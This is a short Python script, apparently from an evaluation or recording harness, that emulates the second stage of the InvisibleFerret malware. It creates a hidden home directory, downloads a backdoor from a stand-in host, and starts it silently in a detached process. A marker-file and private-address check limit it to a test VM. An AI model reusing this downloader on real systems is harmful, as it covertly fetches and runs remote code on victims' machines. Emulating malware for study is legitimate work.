# The second stage (the write-ups' InvisibleFerret, its first script), which
# the stand-in serves at /client/7 and the first stage saves as ~/.nvc and
# starts with python3. As the real one does on a Mac: make a hidden directory
# in the home, fetch the backdoor into it, start it with this Python, and
# exit. (The real one fetches a browser stealer too, but not on macOS.)
#
# It runs only on a recording VM, and stops at once anywhere else.
import ipaddress
import os
import socket
import subprocess
import sys
import urllib.request

HOST = "cdn.shop-metrics.example"
PORT = 1224
ID = "7"

if not os.path.exists("/etc/tangent-eval-vm") or not ipaddress.ip_address(socket.gethostbyname(HOST)).is_private:
    sys.exit(0)

home = os.path.join(os.path.expanduser("~"), ".c3")
os.makedirs(home, exist_ok=True)
run = os.path.join(home, "run")
with urllib.request.urlopen(f"http://{HOST}:{PORT}/payload/{ID}", timeout=30) as r, open(run, "wb") as f:
    f.write(r.read())
subprocess.Popen([sys.executable, run], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL, start_new_session=True)
